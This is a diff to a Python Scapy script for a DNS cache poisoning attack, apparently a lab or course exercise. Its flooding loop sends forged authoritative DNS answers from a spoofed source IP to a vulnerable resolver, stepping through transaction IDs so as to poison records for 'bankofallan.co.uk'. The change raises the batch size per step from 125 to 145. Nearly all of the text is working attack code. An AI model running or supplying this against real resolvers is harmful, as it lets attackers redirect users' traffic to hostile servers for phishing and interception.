@@ -136,14 +136,15 @@ def flooding_job(passo):
                 send(pkt, verbose=0)'''
 
         count = 0
-        while (RESTART == 0 and count <= 125):
+        step = 145
+        while (RESTART == 0 and count <= step):
                 # mando pacchetti con il qID che varia
 
                 # send(IP(dst=VULN_DNS_IP, src=DNS_SPOOF_IP) / UDP(sport=53, dport=PORT_NUMBER) / DNS(rd=1, qd=DNS(qname="badguy.ru")))
 
                 # build the packet
                 pkt = IP(dst=VULN_DNS_IP, src=DNS_SPOOF_IP) / UDP(sport=53, dport=PORT_NUMBER) / \
-                      DNS(id=(Q_ID + 1 + passo*125 + count), qr=1L, opcode='QUERY', aa=1L, tc=0L, rd=1L, ra=1L, z=0L, rcode='ok',
+                      DNS(id=(Q_ID + 1 + passo*step + count), qr=1L, opcode='QUERY', aa=1L, tc=0L, rd=1L, ra=1L, z=0L, rcode='ok',
                           qdcount=1, ancount=1,
                           nscount=0, arcount=0,
                           qd=(DNSQR(qname='bankofallan.co.uk', qtype='NS', qclass='IN')),
